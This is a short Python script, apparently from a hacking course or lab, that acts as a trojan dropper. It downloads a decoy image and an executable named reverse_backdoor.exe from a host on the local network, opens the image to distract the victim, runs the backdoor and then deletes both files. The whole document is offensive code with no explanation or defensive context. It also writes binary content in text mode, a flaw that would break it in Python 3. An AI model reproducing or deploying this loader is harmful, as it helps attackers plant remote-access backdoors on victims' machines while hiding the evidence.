import subprocess, requests, os, tempfile


def download(url):
    res = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "w") as f:
        f.write(res.content)

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("http://192.168.1.2/evil-files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://192.168.1.2/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")